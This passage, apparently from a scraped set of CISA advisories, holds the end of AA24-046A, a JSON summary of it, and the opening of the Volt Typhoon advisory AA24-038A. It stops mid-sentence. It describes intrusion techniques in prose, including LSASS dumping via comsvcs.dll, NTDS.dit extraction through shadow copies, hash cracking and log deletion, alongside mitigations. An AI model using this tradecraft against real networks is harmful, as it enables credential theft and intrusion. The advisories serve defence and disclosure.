The actor used a compromised account (USER2) which was 
synced to both the on-premises AD and Azure AD, thus 
enabling administrative privileges to both the on-premises 
network and Azure tenant. 
Table 6: Credential Access 
Technique Title 
ID 
Use 
Unsecured 
Credentials: 
Credentials in Files 
T1552.001 
The actor likely obtained USER2 account credentials from the 
virtualized SharePoint server where they were locally stored. 
Table 7: Discovery 
Technique Title 
ID 
Use 
Account Discovery: 
Domain Account 
T1087.002 
Through the VM connection, the actor executed LDAP 
queries of the AD. 
 
 
 
CISA | MS-ISAC  
Page 6 of 10  |  Product ID: AA24-046A 
TLP:CLEAR 
 
TLP:CLEAR 
Technique Title 
ID 
Use 
Remote System 
Discovery 
T1018 
Through the VM connection, the actor executed LDAP 
queries to collect user and host information. 
Domain Trust 
Discovery 
T1482 
Through the VM connection, the actor executed LDAP 
queries to collect trust relationship information. 
File and Directory 
Discovery 
T1083 
The actor authenticated to the CIFS on various endpoints 
likely for the purpose of file, folder, and directory discovery. 
Network Service 
Discovery 
T1046 
The actor used the compromised USER1 account to 
authenticate to four services, presumably for the purpose of 
network and service discovery. 
Table 8: Lateral Movement 
Technique Title 
ID 
Use 
Remote Services 
T1021 
The actor connected from an unknown VM and 
authenticated to multiple services via the USER1 account. 
Remote Services: 
Cloud Services 
T1021.007 
The actor used the USER2 account, which granted access to 
the Azure AD, as well as the on-premises AD. 
Remote Services: 
SMB/Windows 
Admin Shares 
T1021.002 
The actor used compromised accounts to interact with a 
remote network share using Server Message Block. 
Table 9: Collection 
Technique Title 
ID 
Use 
Data from 
Information 
Repositories: 
SharePoint 
T1213.002 
The actor likely obtained the USER2 account credentials from 
the virtualized SharePoint server managed by USER1. 
MITIGATIONS 
Note: These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) 
developed by CISA and the National Institute of Standards and Technology (NIST), which apply to all 
critical infrastructure organizations and network defenders. The CPGs provide a minimum set of 
practices and protections that CISA and NIST recommend all organizations implement. CISA and 
NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most 
common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector 
 
 
 
CISA | MS-ISAC  
Page 7 of 10  |  Product ID: AA24-046A 
TLP:CLEAR 
 
TLP:CLEAR 
Cybersecurity Performance Goals for more information on the CPGs, including additional 
recommended baseline protections.  
Secure and Monitor Administrator Accounts 
The threat actor gained access to the network via compromised administrator accounts that did not 
have MFA enabled. The compromised USER2 Global Domain Administrator account could have 
enabled the threat actor to move laterally from the on-premises environment to the Azure tenant. In 
response to the incident, the victim organization removed administrator privileges for USER2. 
Additionally, the victim organization disabled unnecessary administrator accounts and enabled MFA 
for all administrator accounts. To prevent similar compromises, CISA and MS-ISAC recommend the 
following: 
• 
Review current administrator accounts to determine their necessity and only maintain 
administrator accounts that are essential for network management. This will reduce the attack 
surface and focus efforts on the security and monitoring of necessary accounts. 
• 
Restrict the use of multiple administrator accounts for one user. 
• 
Create separate administrator accounts for on-premises and Azure environments to segment 
access. 
• 
Implement the principle of least privilege to decrease threat actor’s ability to access key 
network resources. Enable just-in-time and just enough access for administrator accounts to 
elevate the minimum necessary privileges for a limited time to complete tasks. 
• 
Use phishing-resistant multifactor authentication (MFA) [CPG 2.H] (e.g., security tokens) 
for remote access and access to any sensitive data repositories. Implement phishing-resistant 
MFA for as many services as possible—particularly for webmail and VPNs—for accounts that 
access critical systems and privileged accounts that manage backups. MFA should also be 
used for remote logins [M1032]. For additional guidance on secure MFA configurations, visit 
CISA’s More than a Password webpage and read CISA’s Implementing Phishing-Resistant 
MFA fact sheet. 
Reduce Attack Surface 
Unnecessary accounts, software, and services in the network create additional vectors for a threat actor 
to compromise. CISA and MS-ISAC recommend the following: 
• 
Establish policy and procedure for the prompt removal of unnecessary accounts and 
groups from the enterprise, especially privileged accounts. Organizations should implement a 
robust and continuous user management process to ensure accounts of offboarded 
employees are removed and can no longer access the network. 
• 
Maintain a robust asset management policy through comprehensive documentation of 
assets, tracking current version information to maintain awareness of outdated software, and 
mapping assets to business and critical functions. 
o Determine the need and functionality of assets that require public internet exposure [CPG 
1.A]. 
 
 
 
CISA | MS-ISAC  
Page 8 of 10  |  Product ID: AA24-046A 
TLP:CLEAR 
 
TLP:CLEAR 
• 
Follow a routine patching cycle for all operating systems, applications, and software 
(including all third-party software) to mitigate the potential for exploitation. 
• 
Restrict personal devices from connecting to the network. Personal devices are not 
subject to the same group policies and security measures as domain joined devices. 
Evaluate Tenant Settings 
By default, in Azure AD all users can register and manage all aspects of applications they create. 
Users can also determine and approve what organizational data and services the application can 
access. These default settings can enable a threat actor to access sensitive information and move 
laterally in the network. In addition, users who create an Azure AD automatically become the Global 
Administrator for that tenant. This could allow a threat actor to escalate privileges to execute 
malicious actions. CISA and MS-ISAC recommend the following: 
• 
Evaluate current user permissions in the Azure tenant to restrict potentially harmful 
permissions including: 
o Restrict users’ ability to register applications. By default, all users in Azure AD can register 
and manage the applications they create and approve the data and services the 
application can access. If this is exploited, a threat actor can access sensitive information 
and move laterally in the network. 
o Restrict non-administrators from creating tenants. Any user who creates an Azure AD 
automatically becomes the Global Administrator for that tenant. This creates an 
opportunity for a threat actor to escalate privileges to the highest privileged account. 
o Restrict access to the Azure AD portal to administrators only. Users without administrative 
privileges cannot change settings, however, they can view user info, group info, device 
details, and user privileges. This would allow a threat actor to gather valuable information 
for malicious activities. 
Create a Forensically Ready Organization 
• 
Collect access- and security-focused logs (e.g., intrusion detection systems/intrusion 
prevention systems, firewall, data loss prevention, and virtual private network) for use in both 
detection and incident response activities [CPG 2.T]. 
• 
Enable complete coverage of tools, including Endpoint Detection and Response (EDR), 
across the environment for thorough analysis of anomalous activity and remediation of 
potential vulnerabilities. 
Assess Security Configuration of Azure Environment 
CISA created the Secure Cloud and Business Applications (SCuBA) assessment tool to help Federal 
Civilian Executive Branch (FCEB) agencies to verify that a M365 tenant configuration conforms to a 
minimal viable secure configuration baseline. Although the SCuBA assessment tool was developed 
for FCEB, other organizations can benefit from its output. CISA and MS-ISAC recommend the 
following: 
 
 
 
CISA | MS-ISAC  
Page 9 of 10  |  Product ID: AA24-046A 
TLP:CLEAR 
 
TLP:CLEAR 
• 
Use tools that identify attack paths. This will enable defenders to identify common attack 
paths used by threat actors and shut them down before they are exploited. 
• 
Review the security recommendations list provided by Microsoft 365 Defender. Focus 
remediation on critical vulnerabilities on endpoints that are essential to mission execution and 
contain sensitive data. 
Evaluate Conditional Access Policies 
Conditional access policies require users who want to access a resource to complete an action. 
Conditional access policies also account for common signals, such as user or group memberships, IP 
location information, device, application, and risky sign-in behavior identified through integration with 
Azure AD Identity Protection. 
• 
Review current conditional access policies to determine if changes are necessary. 
Reset All Passwords and Establish Secure Password Policies 
In response to the incident, the victim organization reset passwords for all users. 
• 
Employ strong password management alongside other attribute-based information, such as 
device information, time of access, user history, and geolocation data. Set a password policy 
to require complex passwords for all users (minimum of 16 characters) and enforce this new 
requirement as user passwords expire [CPG 2.A],[CPG 2.B],[CPG 2.C]. 
• 
Store credentials in a secure manner, such as with a credential manager, vault, or other 
privileged account management solution [CPG 2.L]. 
• 
For products that come with default passwords, ask vendors how they plan to eliminate 
default passwords, as highlighted in CISA’s Secure by Design Alert: How Manufacturers Can 
Protect Customers by Eliminating Default Passwords. 
Mitigations for Vendors 
CISA recommends that vendors incorporate secure by design principles and tactics into their 
practices, limiting the impact of threat actor techniques and strengthening the secure posture for their 
customers. 
• 
Prioritize secure by default configurations, such as eliminating default passwords and 
providing high-quality audit logs to customers with no additional configuration, at no extra 
charge. Secure by default configurations should be prioritized to eliminate the need for 
customer implementation of hardening guidance. 
• 
Immediately identify, mitigate, and update affected products that are not patched in 
accordance with CISA’s Known Exploited Vulnerabilities (KEV) catalog. 
• 
Implement multifactor authentication (MFA), ideally phishing-resistant MFA, as a default 
(rather than opt-in) feature for all products. 
VALIDATE SECURITY CONTROLS 
In addition to applying mitigations, CISA and MS-ISAC recommend exercising, testing, and validating 
your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for 
 
 
 
CISA | MS-ISAC  
Page 10 of 10  |  Product ID: AA24-046A 
TLP:CLEAR 
 
TLP:CLEAR 
Enterprise framework in this advisory. CISA recommends testing your existing security controls 
inventory to assess how they perform against the ATT&CK techniques described in this advisory. 
To get started: 
1. Select an ATT&CK technique described in this advisory (see table 2-9). 
2. Align your security technologies against the technique. 
3. Test your technologies against the technique. 
4. Analyze your detection and prevention technologies’ performance. 
5. Repeat the process for all security technologies to obtain a set of comprehensive performance 
data. 
6. Tune your security program, including people, processes, and technologies, based on the 
data generated by this process. 
CISA and MS-ISAC recommend continually testing your security program, at scale, in a production 
environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this 
advisory. 
RESOURCES 
• 
MS-ISAC: Center for Internet Security (CIS) Cyber-Attack Defense: CIS Benchmarks + CDM + 
MITRE ATT&CK 
REFERENCES 
[1] CISA Analysis: Fiscal Year 2022 Risk and Vulnerability Assessments 
DISCLAIMER 
The information in this report is being provided “as is” for informational purposes only. CISA and MS-
ISAC do not endorse any commercial entity, product, company, or service, including any entities, 
products, or services linked within this document. Any reference to specific commercial entities, 
products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not 
constitute or imply endorsement, recommendation, or favoring by CISA or MS-ISAC. 
VERSION HISTORY 
February 15, 2024: Initial version. 
",Threat Actor Leverages Compromised Account of Former Employee to Access State Government Organization,"{
  ""ID"": ""AA24-046A"",
  ""URL"": ""https://www.cisa.gov/tlp"",
  ""Title"": ""Threat Actor Leverages Compromised Account of Former Employee to Access State Government Organization"",
  ""Release Date"": ""2024-02-15"",
  ""Last Updated"": ""2024-02-15"",
  ""Severity"": ""High"",
  ""Affected Systems"": [
    ""State Government Organization's Network"",
    ""Azure Environment""
  ],
  ""Summary"": ""This advisory details an incident where an unidentified threat actor compromised network administrator credentials through the account of a former employee to access a state government organization's network."",
  ""Procedures"": {
    ""Account Compromise"": ""The threat actor compromised the account of a former employee with administrative privileges to gain initial access to the victim's on-premises environment."",
    ""Credential Theft"": ""The threat actor likely obtained USER1 account credentials from an external data breach and exploited stored administrator credentials on a virtualized SharePoint server to gain further access.""
  },
  ""Tactics"": {
    ""Initial Access"": ""The actor gained initial access through compromised domain accounts."",
    ""Privilege Escalation"": ""Using valid credentials from compromised accounts to gain administrative access."",
    ""Credential Access"": ""The theft of credentials stored insecurely on a SharePoint sever and those obtained from a data breach.""
  },
  ""Techniques"": {
    ""Valid Accounts"": ""Using compromised credentials of former employees and administrators to access network services and sensitive data."",
    ""Execution of LDAP Queries"": ""Executed LDAP queries against a domain controller to gather data including user, host, and trust relationship information, and generated files to sell on the dark web."",
    ""Service Authentication"": ""Authenticated to various services within the network using compromised accounts to discover and potentially infiltrate other network areas.""
  },
  ""Threat Actions"": [
    ""Posting documents containing sensitive information on the dark web"",
    ""Unsecure LDAP queries gathering network information for potential sale or further exploitation""
  ],
  ""Indicators of Compromise"": {
    ""IPs"": [
      ""Unknown - specific IPs used in the VPN connection""
    ],
    ""Domains"": [],
    ""Hashes"": []
  },
  ""Mitigation Strategies"": ""To mitigate such threats, CISA and MS-ISAC recommend securing and monitoring administrator accounts, implementing phishing-resistant MFA, reducing attack surfaces by removing unnecessary accounts, securely storing credentials, evaluating tenant settings, and enabling complete coverage of EDR tools across the environment."",
  ""References"": [
    ""https://www.cisa.gov/tlp"",
    ""https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-046a""
  ]
}"
02-07-2024,https://firebasestorage.googleapis.com/v0/b/ooda-nsec.appspot.com/o/data%2Faa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf?alt=media&token=a875db45-cd97-413d-a0cb-b79776ca8117," 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information 
carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public 
release. Subject to standard copyright rules, TLP:CLEAR information may be distributed without restriction. For 
more information on the Traffic Light Protocol, see cisa.gov/tlp. 
 
TLP:CLEAR 
Product ID: AA24-038A 
 
February 7, 2024 
Co-Authored by: 
TLP:CLEAR 
 
 
 
PRC State-Sponsored Actors Compromise and 
Maintain Persistent Access to U.S. Critical 
Infrastructure 
 
 
 
 
TLP:CLEAR 
Page 2 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
SUMMARY 
The Cybersecurity and Infrastructure Security 
Agency (CISA), National Security Agency (NSA), 
and Federal Bureau of Investigation (FBI) assess 
that People’s Republic of China (PRC) state-
sponsored cyber actors are seeking to pre-
position themselves on IT networks for disruptive 
or destructive cyberattacks against U.S. critical 
infrastructure in the event of a major crisis or 
conflict with the United States. 
CISA, NSA, FBI and the following partners are 
releasing this advisory to warn critical 
infrastructure organizations about this 
assessment, which is based on observations 
from the U.S. authoring agencies’ incident 
response activities at critical infrastructure organizations compromised by the PRC state-sponsored 
cyber group known as Volt Typhoon (also known as Vanguard Panda, BRONZE SILHOUETTE, Dev-
0391, UNC3236, Voltzite, and Insidious Taurus): 
• 
U.S. Department of Energy (DOE) 
• 
U.S. Environmental Protection Agency (EPA) 
• 
U.S. Transportation Security Administration (TSA) 
• 
Australian Signals Directorate’s (ASD’s) Australian Cyber Security Centre (ACSC) 
• 
Canadian Centre for Cyber Security (CCCS), a part of the Communications Security 
Establishment (CSE) 
• 
United Kingdom National Cyber Security Centre (NCSC-UK) 
• 
New Zealand National Cyber Security Centre (NCSC-NZ) 
The U.S. authoring agencies have confirmed that Volt Typhoon has compromised the IT 
environments of multiple critical infrastructure organizations—primarily in Communications, Energy, 
Transportation Systems, and Water and Wastewater Systems Sectors—in the continental and non-
continental United States and its territories, including Guam. Volt Typhoon’s choice of targets and 
pattern of behavior is not consistent with traditional cyber espionage or intelligence gathering 
operations, and the U.S. authoring agencies assess with high confidence that Volt Typhoon actors 
are pre-positioning themselves on IT networks to enable lateral movement to OT assets to disrupt 
functions. The U.S. authoring agencies are concerned about the potential for these actors to use their 
network access for disruptive effects in the event of potential geopolitical tensions and/or military 
conflicts. CCCS assesses that the direct threat to Canada’s critical infrastructure from PRC state-
sponsored actors is likely lower than that to U.S. infrastructure, but should U.S. infrastructure be 
disrupted, Canada would likely be affected as well, due to cross-border integration. ASD’s ACSC and 
NCSC-NZ assess Australian and New Zealand critical infrastructure, respectively, could be vulnerable 
to similar activity from PRC state-sponsored actors. 
Actions to take today to mitigate Volt 
Typhoon activity: 
• Apply patches for internet-facing 
systems. Prioritize patching critical 
vulnerabilities in appliances known to be 
frequently exploited by Volt Typhoon. 
• Implement phishing-resistant MFA. 
• Ensure logging is turned on for 
application, access, and security logs 
and store logs in a central system. 
• Plan “end of life” for technology 
beyond manufacturer’s supported 
lifecycle. 
 
 
 
 
 
 
 
 
TLP:CLEAR 
Page 3 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
As the authoring agencies have previously highlighted, the use of living off the land (LOTL) 
techniques is a hallmark of Volt Typhoon actors’ malicious cyber activity when targeting critical 
infrastructure. The group also relies on valid accounts and leverage strong operational security, which 
combined, allows for long-term undiscovered persistence. In fact, the U.S. authoring agencies have 
recently observed indications of Volt Typhoon actors maintaining access and footholds within some 
victim IT environments for at least five years. Volt Typhoon actors conduct extensive pre-exploitation 
reconnaissance to learn about the target organization and its environment; tailor their tactics, 
techniques, and procedures (TTPs) to the victim’s environment; and dedicate ongoing resources to 
maintaining persistence and understanding the target environment over time, even after initial 
compromise. 
The authoring agencies urge critical infrastructure organizations to apply the mitigations in this 
advisory and to hunt for similar malicious activity using the guidance herein provided, along with the 
recommendations found in joint guide Identifying and Mitigating Living Off the Land Techniques. 
These mitigations are primarily intended for IT and OT administrators in critical infrastructure 
organizations. Following the mitigations for prevention of or in response to an incident will help disrupt 
Volt Typhoon’s accesses and reduce the threat to critical infrastructure entities. 
If activity is identified, the authoring agencies strongly recommend that critical infrastructure 
organizations apply the incident response recommendations in this advisory and report the incident to 
the relevant agency (see Contact Information section). 
For additional information, see joint advisory People’s Republic of China State-Sponsored Cyber 
Actor Living off the Land to Evade Detection and U.S. Department of Justice (DOJ) press release 
U.S. Government Disrupts Botnet People’s Republic of China Used to Conceal Hacking of Critical 
Infrastructure. For more information on PRC state-sponsored malicious cyber activity, see CISA’s 
China Cyber Threat Overview and Advisories webpage. 
For a downloadable copy of indicators of compromise (IOCs), see: 
• 
MAR-10448362-1.v1 (JSON, 60KB) 
 
 
 
 
 
TLP:CLEAR 
Page 4 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
TABLE OF CONTENTS 
Summary 
............................................................................................................................................. 
2 
Table of Contents ................................................................................................................................ 
4 
Technical Details ................................................................................................................................. 
6 
Overview of Activity.......................................................................................................................... 
6 
Observed TTPs 
................................................................................................................................ 
9 
Reconnaissance 
........................................................................................................................... 
9 
Resource Development 
................................................................................................................ 
9 
Initial Access ................................................................................................................................ 
9 
Execution ..................................................................................................................................... 
9 
Persistence ................................................................................................................................ 
10 
Defense Evasion ........................................................................................................................ 
10 
Credential Access ...................................................................................................................... 
10 
Discovery ................................................................................................................................... 
11 
Lateral Movement 
....................................................................................................................... 
13 
Collection and Exfiltration ........................................................................................................... 
14 
Command and Control 
................................................................................................................... 
15 
Detection/Hunt Recommendations .................................................................................................... 
16 
Apply Living off the Land Detection Best Practices ........................................................................ 
16 
Review Application, Security, and System Event Logs 
................................................................... 
16 
Monitor and Review OT System Logs 
............................................................................................ 
19 
Use gait to Detect Possible Network Proxy Activities ..................................................................... 
20 
Review Logins for Impossible Travel 
.............................................................................................. 
20 
Review Standard Directories for Unusual Files .............................................................................. 
20 
Incident Response 
............................................................................................................................. 
20 
Mitigations ......................................................................................................................................... 
23 
IT Network Administrators and Defenders 
...................................................................................... 
23 
Harden the Attack Surface ......................................................................................................... 
23 
Secure Credentials 
..................................................................................................................... 
24 
Secure Accounts ........................................................................................................................ 
24 
Secure Remote Access Services ............................................................................................... 
26 
Secure Sensitive Data 
................................................................................................................ 
26 
 
 
 
TLP:CLEAR 
Page 5 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
Implement Network Segmentation 
.............................................................................................. 
26 
Secure Cloud Assets 
.................................................................................................................. 
26 
Be Prepared ............................................................................................................................... 
27 
OT Administrators and Defenders 
.................................................................................................. 
28 
Contact Information ........................................................................................................................... 
29 
Validate Security Controls ................................................................................................................. 
30 
References 
........................................................................................................................................ 
30 
Resources ......................................................................................................................................... 
30 
Disclaimer ......................................................................................................................................... 
31 
Acknowledgements ........................................................................................................................... 
31 
Version History 
.................................................................................................................................. 
31 
Appendix A: Volt Typhoon Observed Commands / LOTL Activity 
...................................................... 
32 
Appendix B: Indicators of Compromise 
.............................................................................................. 
36 
Appendix C: MITRE ATT&CK Tactics and Techniques 
...................................................................... 
37 
 
 
 
 
 
TLP:CLEAR 
Page 6 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
TECHNICAL DETAILS 
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 14. See Appendix C: 
MITRE ATT&CK Tactics and Techniques section for tables of the Volt Typhoon cyber threat actors’ 
activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious 
cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for 
MITRE ATT&CK Mapping and CISA’s Decider Tool. 
Overview of Activity 
In May 2023, the authoring agencies—working with industry partners—disclosed information about 
activity attributed to Volt Typhoon (see joint advisory People’s Republic of China State-Sponsored 
Cyber Actor Living off the Land to Evade Detection). Since then, CISA, NSA, and FBI have 
determined that this activity is part of a broader campaign in which Volt Typhoon actors have 
successfully infiltrated the networks of critical infrastructure organizations in the continental and non-
continental United States and its territories, including Guam. 
The U.S. authoring agencies have primarily observed compromises linked to Volt Typhoon in 
Communications, Energy, Transportation Systems, and Water and Wastewater Systems sector 
organizations’ IT networks. Some victims are smaller organizations with limited cybersecurity 
capabilities that provide critical services to larger organizations or key geographic locations. 
Volt Typhoon actors tailor their TTPs to the victim environment; however, the U.S. authoring agencies 
have observed the actors typically following the same pattern of behavior across identified intrusions. 
Their choice of targets and pattern of behavior is not consistent with traditional cyber espionage or 
intelligence gathering operations, and the U.S. authoring agencies assess with high confidence that 
Volt Typhoon actors are pre-positioning themselves on IT networks to enable the disruption of OT 
functions across multiple critical infrastructure sectors (see Figure 1). 
1. Volt Typhoon conducts extensive pre-compromise reconnaissance to learn about the 
target organization’s network architecture and operational protocols. This 
reconnaissance includes identifying network topologies, security measures, typical user 
behaviors, and key network and IT staff. The intelligence gathered by Volt Typhoon actors is 
likely leveraged to enhance their operational security. For example, in some instances, Volt 
Typhoon actors may have abstained from using compromised credentials outside of normal 
working hours to avoid triggering security alerts on abnormal account activities. 
2. Volt Typhoon typically gains initial access to the IT network by exploiting known or 
zero-day vulnerabilities in public-facing network appliances (e.g., routers, virtual private 
networks [VPNs], and firewalls) and then connects to the victim’s network via VPN for follow-
on activities. 
3. Volt Typhoon aims to obtain administrator credentials within the network, often by 
exploiting privilege escalation vulnerabilities in the operating system or network 
services. In some cases, Volt Typhoon has obtained credentials insecurely stored on a 
public-facing network appliance. 
 
 
 
TLP:CLEAR 
Page 7 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
4. Volt Typhoon uses valid administrator credentials to move laterally to the domain 
controller (DC) and other devices via remote access services such as Remote Desktop 
Protocol (RDP). 
5. Volt Typhoon conducts discovery in the victim’s network, leveraging LOTL binaries for 
stealth. A key tactic includes using PowerShell to perform targeted queries on Windows event 
logs, focusing on specific users and periods. These queries facilitate the discreet extraction of 
security event logs into .dat files, allowing Volt Typhoon actors to gather critical information 
while minimizing detection. This strategy, blending in-depth pre-compromise reconnaissance 
with meticulous post-exploitation intelligence collection, underscores their sophisticated and 
strategic approach to cyber operations. 
6. Volt Typhoon achieves full domain compromise by extracting the Active Directory 
database (NTDS.dit) from the DC. Volt Typhoon frequently employs the Volume Shadow 
Copy Service (VSS) using command-line utilities such as vssadmin to access NTDS.dit. The 
NTDS.dit file is a centralized repository that contains critical Active Directory data, including 
user accounts, passwords (in hashed form), and other sensitive data, which can be leveraged 
for further exploitation. This method entails the creation of a shadow copy—a point-in-time 
snapshot—of the volume hosting the NTDS.dit file. By leveraging this snapshot, Volt Typhoon 
actors effectively bypass the file locking mechanisms inherent in a live Windows environment, 
which typically prevent direct access to the NTDS.dit file while the domain controller is 
operational. 
7. Volt Typhoon likely uses offline password cracking techniques to decipher these 
hashes. This process involves extracting the hashes from the NTDS.dit file and then applying 
various password cracking methods, such as brute force attacks, dictionary attacks, or more 
sophisticated techniques like rainbow tables to uncover the plaintext passwords. The 
successful decryption of these passwords allows Volt Typhoon actors to obtain elevated 
access and further infiltrate and manipulate the network. 
8. Volt Typhoon uses elevated credentials for strategic network infiltration and additional 
discovery, often focusing on gaining capabilities to access OT assets. Volt Typhoon 
actors have been observed testing access to domain-joint OT assets using default OT vendor 
credentials, and in certain instances, they have possessed the capability to access OT 
systems whose credentials were compromised via NTDS.dit theft. This access enables 
potential disruptions, such as manipulating heating, ventilation, and air conditioning (HVAC) 
systems in server rooms or disrupting critical energy and water controls, leading to significant 
infrastructure failures (in some cases, Volt Typhoon actors had the capability to access 
camera surveillance systems at critical infrastructure facilities). In one confirmed compromise, 
Volt Typhoon actors moved laterally to a control system and were positioned to move to a 
second control system. 
 
 
 
TLP:CLEAR 
Page 8 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
Figure 1: Typical Volt Typhoon Activity 
After successfully gaining access to legitimate accounts, Volt Typhoon actors exhibit minimal activity 
within the compromised environment (except discovery as noted above), suggesting their objective is 
to maintain persistence rather than immediate exploitation. This assessment is supported by 
observed patterns where Volt Typhoon methodically re-targets the same organizations over extended 
periods, often spanning several years, to continuously validate and potentially enhance their 
unauthorized accesses. Evidence of their meticulous approach is seen in instances where they 
repeatedly exfiltrate domain credentials, ensuring access to current and valid accounts. For example, 
in one compromise, Volt Typhoon likely extracted NTDS.dit from three domain controllers in a four-
year period. In another compromise, Volt Typhoon actors extracted NTDS.dit two times from a victim 
in a nine-month period. 
Industry reporting—identifying that Volt Typhoon actors are silent on the network following credential 
dumping and perform discovery to learn about the environment, but do not exfiltrate data—is 
consistent with the U.S. authoring agencies’ observations. This indicates their aim is to achieve and 
maintain persistence on the network. In one confirmed compromise, an industry partner observed Volt 
Typhoon actors dumping credentials at regular intervals. 
In addition to leveraging stolen account credentials, the actors use LOTL techniques and avoid 
leaving malware artifacts on systems that would cause alerts. Their strong focus on stealth and 
operational security allows them to maintain long-term, undiscovered persistence. Further, Volt 
Typhoon’s operational security is enhanced by targeted log deletion to conceal their actions within the 
compromised environment. 
See the below sections for Volt Typhoon TTPs observed by the U.S. authoring agencies from multiple 
confirmed Volt Typhoon compromises. 
 
 
 
TLP:CLEAR 
Page 9 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
Observed TTPs 
Reconnaissance 
Volt Typhoon actors conduct extensive pre-compromise reconnaissance [TA0043] to learn about the 
target organization [T1591], its network [T1590], and its staff [T1589]. This includes web searches 
[T1593]—including victim-owned sites [T1594]—for victim host [T1592], identity, and network 
information, especially for information on key network and IT administrators. According to industry 
reporting, Volt Typhoon actors use FOFA[1], Shodan, and Censys for querying or searching for 
exposed infrastructure. In some instances, the U.S. authoring agencies have observed Volt Typhoon 
actors targeting the personal emails of key network and IT staff [T1589.002] post compromise. 
Resource Development 
Historically, Volt Typhoon actors use multi-hop proxies for command and control (C2) infrastructure 
[T1090.003]. The proxy is typically composed of virtual private servers (VPSs) [T1583.003] or small 
office/home office (SOHO) routers. Recently, Volt Typhoon actors used Cisco and NETGEAR end-of-
life SOHO routers implanted with KV Botnet malware to support their operations [T1584.005]. (See 
DOJ press release U.S. Government Disrupts Botnet People’s Republic of China Used to Conceal 
Hacking of Critical Infrastructure for more information). 
Initial Access 
To obtain initial access [TA0001], Volt Typhoon actors commonly exploit vulnerabilities in networking 
appliances such as those from Fortinet, Ivanti Connect Secure (formerly Pulse Secure), NETGEAR, 
Citrix, and Cisco [T1190]. They often use publicly available exploit code for known vulnerabilities 
[T1588.005] but are also adept at discovering and exploiting zero-day vulnerabilities [T1587.004]. 
• 
In one confirmed compromise, Volt Typhoon actors likely obtained initial access by exploiting 
CVE-2022-42475 in a network perimeter FortiGate 300D firewall that was not patched. There 
is evidence of a buffer overflow attack identified within the Secure Sockets Layer (SSL)-VPN 
crash logs. 
Once initial access is achieved, Volt Typhoon actors typically shift to establishing persistent access 
[TA0003]. They often use VPN sessions to securely connect to victim environments [T1133], enabling 
discreet follow-on intrusion activities. This tactic not only provides a stable foothold in the network but 
also allows them to blend in with regular traffic, significantly reducing their chances of detection. 
Execution 
Volt Typhoon actors rarely use malware for post-compromise execution. Instead, once Volt Typhoon 
actors gain access to target environments, they use hands-on-keyboard activity via the command-line 
[T1059] and other native tools and processes on systems [T1218] (often referred to as “LOLBins”), 
known as LOTL, to maintain and expand access to the victim networks. According to industry 
reporting, some “commands appear to be exploratory or experimental, as the operators [i.e., 
malicious actors] adjust and repeat them multiple times.”[2] 
 
 
 
TLP:CLEAR 
Page 10 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
For more details on LOTL activity, see the Credential Access and Discovery sections and Appendix 
A: Volt Typhoon LOTL Activity. 
Similar to LOTL, Volt Typhoon actors also use legitimate but outdated versions of network admin 
tools. For example, in one confirmed compromise, actors downloaded [T1105] an outdated version of 
comsvcs.dll on the DC in a non-standard folder. comsvcs.dll is a legitimate Microsoft Dynamic 
Link Library (DLL) file normally found in the System32 folder. The actors used this DLL with MiniDump 
and the process ID of the Local Security Authority Subsystem Service (LSASS) to dump the LSASS 
process memory [T1003.001] and obtain credentials (LSASS process memory space contains hashes 
for the current user’s operating system (OS) credentials). 
The actors also use legitimate non-native network admin and forensic tools. For example, Volt 
Typhoon actors have been observed using Magnet RAM Capture (MRC) version 1.20 on domain 
controllers. MRC is a free imaging tool that captures the physical memory of a computer, and Volt 
Typhoon actors likely used it to analyze in-memory data for sensitive information (such as credentials) 
and in-transit data not typically accessible on disk. Volt Typhoon actors have also been observed 
implanting Fast Reverse Proxy (FRP) for command and control.[3] (See the Command and Control 
section). 
Persistence 
Volt Typhoon primarily relies on valid credentials for persistence [T1078]. 
Defense Evasion 
Volt Typhoon has strong operational security. Their actors primarily use LOTL for defense evasion 
[TA0005], which allows them to camouflage their malicious activity with typical system and network 
behavior, potentially circumventing simplistic endpoint security capabilities. For more information, see 
joint guide Identifying and Mitigating Living off the Land Techniques. 
Volt Typhoon actors also obfuscate their malware. In one confirmed compromise, Volt Typhoon 
obfuscated FRP client files (BrightmetricAgent.exe and SMSvcService.exe) and the command-
line port scanning utility ScanLine by packing the files with Ultimate Packer for Executables (UPX) 
[T1027.002]. FRP client applications support encryption, compression, and easy token authentication 
and work across multiple protocols—including transmission control protocol (TCP), user datagram 
protocol (UDP), hypertext transfer protocol (HTTP), and hypertext transfer protocol secure (HTTPS). 
The FRP client applications use the Kuai connection protocol (KCP) for error-checked and 
anonymous data stream delivery over UDP, with packet-level encryption support. See Appendix C 
and CISA Malware Analysis Report (MAR)-10448362-1.v1 for more information. 
In addition to LOTL and obfuscation techniques, Volt Typhoon actors have been observed selectively 
clearing Windows Event Logs [T1070.001], system logs, and other technical artifacts to remove 
evidence [T1070.009] of their intrusion activity and masquerading file names [T1036.005]. 
Credential Access 
Volt Typhoon actors first obtain credentials from public-facing appliances after gaining initial access 
by exploiting privilege escalation vulnerabilities [T1068] in the operating system or network services. 
 
 
 
TLP:CLEAR 
Page 11 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
In some cases, they have obtained credentials insecurely stored on the appliance [T1552]. In one 
